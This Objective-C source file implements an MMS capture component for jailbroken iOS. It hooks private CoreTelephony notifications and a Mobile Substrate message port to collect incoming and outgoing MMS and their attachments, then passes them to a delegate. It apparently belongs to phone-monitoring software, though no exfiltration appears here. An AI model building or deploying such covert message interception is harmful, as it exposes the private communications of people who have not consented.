//
//  MMSNotifier.m
//  MMSCaptureManager
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MMSNotifier.h"
#import "MMSCaptureDAO.h"
#import "TelephonyNotificationManager.h"
#import "FxMmsEvent.h"
#import "CTMessageCenter.h"
#import "DefStd.h"

#import <UIKit/UIKit.h>

@interface MMSNotifier (private)
- (void) messageReceived: (NSNotification *) aNotification;
- (void) messageSent: (NSNotification *) aNotification;
- (void) createMMSEvents;
- (void) createMMSEvent: (NSInteger) aROWID;
@end

@implementation MMSNotifier

@synthesize mMMSAttachmentPath;
@synthesize mDelegate, mEventsSelector, mEventSelector;

- (id) initWithTelephonyNotificationManager: (id <TelephonyNotificationManager>) aTelephonyNotificationManager {
	if ((self = [super init])) {
		mTelephonyNotificationManager = aTelephonyNotificationManager;
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kMMSMessagePortIOS6plus
												 withMessagePortIPCDelegate:self];
		mMMSInfoArray = [[NSMutableArray alloc] init];
		mAttSavingQueue = [[NSOperationQueue alloc] init];
	}
	return (self);
}

- (void) start {
	/*
	// Outgoing
//	[mTelephonyNotificationManager addNotificationListener:self
//											  withSelector:@selector(messageSent:)
//										   forNotification:KSMSMESSAGESENTNOTIFICATION];
	// Incoming
	[mTelephonyNotificationManager addNotificationListener:self
											  withSelector:@selector(messageReceived:)
										   forNotification:KSMSMESSAGERECEIVEDNOTIFICATION];
	// Outgoing (capture rowID in mobile substrate)
	[mMessagePortReader start];
	 */
	
	// Incoming
	[mTelephonyNotificationManager addNotificationListener:self
											  withSelector:@selector(messageReceived:)
										   forNotification:KSMSMESSAGERECEIVEDNOTIFICATION];
	
	NSInteger systemOS = [[[UIDevice currentDevice] systemVersion] intValue];	
	if (systemOS >= 7) {
		DLog (@"START Capture notification of MMS iOS 7,8")
		// Outgoing
		[mTelephonyNotificationManager addNotificationListener:self
												  withSelector:@selector(messageSent:)
											   forNotification:KSMSMESSAGESENTNOTIFICATION];
	} else {
		
		// Outgoing (capture rowID in mobile substrate)
		[mMessagePortReader start];
	}
}

- (void) stop {
	/*
	// Outgoing
//	[mTelephonyNotificationManager removeListner:self withName:KSMSMESSAGESENTNOTIFICATION];
	// Incoming
	[mTelephonyNotificationManager removeListner:self withName:KSMSMESSAGERECEIVEDNOTIFICATION];
	// Outgoing (capture rowID in mobile substrate)
	[mMessagePortReader stop];
	 */
	
	// Incoming
	[mTelephonyNotificationManager removeListner:self withName:KSMSMESSAGERECEIVEDNOTIFICATION];
	
	NSInteger systemOS = [[[UIDevice currentDevice] systemVersion] intValue];	
	if (systemOS >= 7) {
		DLog (@"STOP Capture notification of MMS iOS 7,8")
		// Outgoing
		[mTelephonyNotificationManager removeListner:self withName:KSMSMESSAGESENTNOTIFICATION];
	} else {
		// Outgoing (capture rowID in mobile substrate)
		[mMessagePortReader stop];
	}
}

#pragma mark -
#pragma mark MessagePortIPCReader delegate
#pragma mark -

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"MMS rowID data = %@", aRawData);
	NSInteger rowID = 0;
	if (aRawData) {
		[aRawData getBytes:&rowID length:sizeof(NSInteger)];
		DLog (@"MMS sent with rowID = %ld", (long)rowID);
		
		[self createMMSEvent:rowID];
	}
}

- (void) messageReceived: (NSNotification *) aNotification {
	DLog (@"Message received notification = %@", aNotification);
	NSDictionary *userInfo = [aNotification userInfo];
	NSNumber *kCTMessageTypeKey = [userInfo objectForKey:@"kCTMessageTypeKey"];
	if ([kCTMessageTypeKey intValue] == 1) { // SMS
		// Handle in sms capture manager
	} else if ([kCTMessageTypeKey intValue] == 2) { // MMS
		NSMutableDictionary *mmsInfo = [[NSMutableDictionary alloc] initWithDictionary:userInfo];
		[mmsInfo setObject:[NSNumber numberWithInt:kEventDirectionIn] forKey:@"kFxMessageDirectionKey"];
		[mMMSInfoArray addObject:mmsInfo];
		[mmsInfo release];
		
		[NSObject cancelPreviousPerformRequestsWithTarget:self];
		[self performSelector:@selector(createMMSEvents) withObject:nil afterDelay:1.5];
	}
}

// Send failed does not get the notification ... unlike SMS, be happy! :):):) 555+
- (void) messageSent: (NSNotification *) aNotification {
	// Unlike sms only sent notification when user sent mms to multiple recipients
	DLog (@"Message sent notification = %@", aNotification);
	NSDictionary *userInfo = [aNotification userInfo];
	NSNumber *kCTMessageTypeKey = [userInfo objectForKey:@"kCTMessageTypeKey"];
	if ([kCTMessageTypeKey intValue] == 1) { // SMS
		// Handle in sms capture manager
	} else if ([kCTMessageTypeKey intValue] == 2) { // MMS
		NSMutableDictionary *mmsInfo = [[NSMutableDictionary alloc] initWithDictionary:userInfo];
		[mmsInfo setObject:[NSNumber numberWithInt:kEventDirectionOut] forKey:@"kFxMessageDirectionKey"];
		[mMMSInfoArray addObject:mmsInfo];
		[mmsInfo release];
		
		[NSObject cancelPreviousPerformRequestsWithTarget:self];
		[self performSelector:@selector(createMMSEvents) withObject:nil afterDelay:0.1];
	}
}

// This is called for incoming MMS (IOS 8)

- (void) createMMSEvents {
	MMSCaptureDAO *mmsDAO = [[MMSCaptureDAO alloc] init];
	[mmsDAO setMAttachmentPath:mMMSAttachmentPath];
	[mmsDAO setMAttSavingQueue:mAttSavingQueue];
	NSArray *mmsEvents = [mmsDAO selectMMSEvents:[mMMSInfoArray count]];
	[mMMSInfoArray removeAllObjects];
	if ([mDelegate respondsToSelector:mEventsSelector]) {
		[mDelegate performSelector:mEventsSelector withObject:mmsEvents];
	}
	[mmsDAO release];
	
	DLog (@"MMS events                  = %@", mmsEvents);
	DLog (@"statusOfOutgoingMessages    = %@", [[CTMessageCenter sharedMessageCenter] statusOfOutgoingMessages]);
}

- (void) createMMSEvent: (NSInteger) aROWID {
	MMSCaptureDAO *mmsDAO = [[MMSCaptureDAO alloc] init];
	[mmsDAO setMAttachmentPath:mMMSAttachmentPath];
	[mmsDAO setMAttSavingQueue:mAttSavingQueue];
	FxMmsEvent *mmsEvent = [mmsDAO selectMMSEvent:aROWID];
	if ([mDelegate respondsToSelector:mEventSelector]) {
		[mDelegate performSelector:mEventSelector withObject:mmsEvent];
	}
	[mmsDAO release];
	
	DLog (@"MMS event = %@", mmsEvent);
}

- (void) release {
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[super release];
}

- (void) dealloc {
	DLog (@"dealloc")
	[self stop];
	[mMessagePortReader release];
	[mMMSAttachmentPath release];
	[mAttSavingQueue cancelAllOperations];
	[mAttSavingQueue release];
	[mMMSInfoArray release];
	
	[super dealloc];
}

@end
